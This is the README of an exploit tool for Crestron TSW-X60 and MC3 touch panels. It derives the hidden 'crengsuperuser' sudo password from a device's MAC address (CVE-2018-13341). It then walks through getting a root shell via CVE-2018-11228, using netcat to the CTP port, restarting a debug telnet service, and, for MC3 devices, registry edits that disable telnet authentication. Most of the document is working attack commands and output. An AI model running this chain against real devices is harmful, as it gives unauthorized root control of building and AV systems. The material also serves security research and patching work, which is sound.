crestron_getsudopwd
===================

Based on [Ricky Lawshae](https://github.com/headlesszeke) discovery on Crestron TSW-X60 and MC3 devices, this tool aims to exploit the [CVE-2018-13341](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-13341). Using the MAC address of the targeted device, you can recover the password of the *"crengsuperuser"* hidden account which has elevated privileges and allow you to run **SUDO** commands.

## Description

On Crestron **TSW-X60** < 2.001.0037.001 and **MC3** < 1.502.0047.00, the passwords for special sudo accounts may be calculated using information accessible to those with regular user privileges. Attackers could decipher these passwords, which may allow them to execute hidden API calls and escape the CTP console sandbox environment with elevated privileges.

The Crestron Toolbox Protocol (CTP) can be connected to by accessing port **41795** on the TSW-XX60 device. Then, you can use the `estat` command to get the MAC address of the device:

```bash
$ nc -C w.x.y.z 41795
TSW-760 Control Console

TSW-760> estat

The EST command has been made obsolete. Please use IPCONFIG instead.
Ethernet Adapter [XYZ]:
	Link Status ....... : OK
	DHCP .............. : ON
	MAC Address ....... : 00.XX.XX.XX.XX.XX
	IP Address ........ : [removed]
	Subnet Mask ....... : [removed]
	IPV6 Address ...... : [removed]
	Default Gateway ... : [removed]


	DNS Servers ........ : [removed]    | DHCP      |
	                       [removed]    | DHCP      |
```

## Requirements

This tool requires the [cryptography](https://cryptography.io/en/latest/) module.

```bash
$ pip3 install cryptography
```
**OR**
```bash
$ pip3 install -r requirements.txt
```

## Getting Started

```bash
usage: crestron_getsudopwd.py [-h] [-m MAC]

Tool to generate Crestron hidden accounts passwords

optional arguments:
  -h, --help         show this help message and exit
  -m MAC, --mac MAC  Target MAC address (w/o colons or dots)


# Example
$ python3 crestron_getsudopwd.py -m aabbccddeeff
[*] Device MAC address: AABBCCDDEEFF
[*] Password for 'crengsuperuser': RgXkA6Q415puxN0t
```

## Exploiting the CVE-2018-11228

The [CVE-2018-11228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-11228) allows unauthenticated RCE via Bash Shell Service in Crestron Terminal Protocol (*CTP*). After getting the password of the *"crengsuperuser"* hidden account you can get a **root** access on the underlying Linux box.

```bash
$ nc -C w.x.y.z 41795

TSW-760 Control Console

TSW-760> TELNETPORT OFF
Telnet Port: Off
TSW-760> SUDO RESTARTSERVICE telnetd_debug
Username: crengsuperuser
Password: **************

Service telnetd_debug restarted

TSW-760>
```

Then, in a new shell, you can get **root** access on the box.

```bash
$ telnet w.x.y.z

bash-3.2# whoami
root
```

> **Note :** This example is for **TSW** devices. The process is slightly different for **MC3** devices. You have to use the following commands to enable the shell: `SUDO -SN:crengsuperuser -SP:password REGEDIT \\comm\\telnetd addval UseAuthentication DWORD 0` then, `SUDO -SN:crengsuperuser -SP:password LAUNCH \\windows\\services.exe /params start tel0:`

## Resources

Here are some interesting resources related to this vulnerability :

- [Security Advisory Regarding Crestron TSW-XX60 Touch Panel Devices](https://resources.securitycompass.com/blog/security-advisory-regarding-crestron-tsw-xx60-touch-panel-devices-2)
- [Ricky "HeadlessZeke" Lawshae - Github](https://github.com/headlesszeke/defcon26-materials)
- [Hacking Crestron IoT Automation Systems - DEFCON 26](https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/DEFCON-26-Lawshae-Who-Controls-the-Controllers-Hacking-Crestron.pdf)
